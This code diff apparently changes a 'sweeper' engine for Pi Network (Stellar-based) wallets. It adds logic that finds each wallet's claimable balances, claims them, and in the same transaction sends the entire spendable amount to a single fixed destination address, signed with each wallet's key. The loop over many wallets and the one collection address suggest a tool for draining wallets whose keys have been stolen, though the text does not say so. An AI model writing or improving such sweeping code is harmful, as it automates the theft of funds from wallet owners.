@@ -77,16 +77,41 @@ const SweeperEngine = {
     try {
       const account = await server.loadAccount(publicKey);
       const native = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI');
-      if (!native) return { spendable: 0, verified: false };
-
-      const ledgerTotal = Number(native.balance || 0);
+      
+      let ledgerTotal = native ? Number(native.balance || 0) : 0;
       let locked = 0;
-      if (Object.prototype.hasOwnProperty.call(native, 'locked_balance')) {
+      if (native && Object.prototype.hasOwnProperty.call(native, 'locked_balance')) {
         locked = Number(native.locked_balance || 0);
       }
-      return { spendable: Math.max(0, ledgerTotal - locked), verified: true };
+
+      // Check for any claimable balances waiting to be claimed
+      let claimableTotal = 0;
+      let claimableIds = [];
+      try {
+        const claimableResp = await server.claimableBalances().claimant(publicKey).call();
+        if (claimableResp && claimableResp.records) {
+          for (const cb of claimableResp.records) {
+            // Check if it's native Pi asset
+            if (cb.asset === 'native' || cb.asset.includes('PI')) {
+              claimableTotal += Number(cb.amount || 0);
+              claimableIds.push(cb.id);
+            }
+          }
+        }
+      } catch (claimErr) {
+        // Non-fatal if claimable balance query fails
+      }
+
+      const totalSpendable = Math.max(0, (ledgerTotal - locked) + claimableTotal);
+      const verified = (ledgerTotal > 0 || claimableTotal > 0);
+
+      return { 
+        spendable: totalSpendable, 
+        verified, 
+        claimableIds 
+      };
     } catch (error) {
-      return { spendable: 0, verified: false };
+      return { spendable: 0, verified: false, claimableIds: [] };
     }
   },
 
@@ -120,16 +145,26 @@ const SweeperEngine = {
 
         try {
           const freshAccount = await server.loadAccount(wallet.public_key);
-          const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
+          let txBuilder = new StellarSdk.TransactionBuilder(freshAccount, {
             fee: String(baseFee),
             networkPassphrase: NETWORK_PASSPHRASE
-          })
-          .addOperation(StellarSdk.Operation.payment({
+          });
+
+          // If there are claimable balances, claim them first in the same transaction
+          if (evalResult.claimableIds && evalResult.claimableIds.length > 0) {
+            for (const balanceId of evalResult.claimableIds) {
+              txBuilder.addOperation(StellarSdk.Operation.claimClaimableBalance({ balanceId }));
+            }
+          }
+
+          // Add the payment operation to sweep funds to the destination
+          txBuilder.addOperation(StellarSdk.Operation.payment({
             destination: DESTINATION,
             asset: StellarSdk.Asset.native(),
             amount: targetAmount.toFixed(7)
-          }))
-          .setTimeout(30).build();
+          }));
+
+          const transaction = txBuilder.setTimeout(30).build();
 
           transaction.sign(sourceKeypair);
           const response = await server.submitTransaction(transaction);
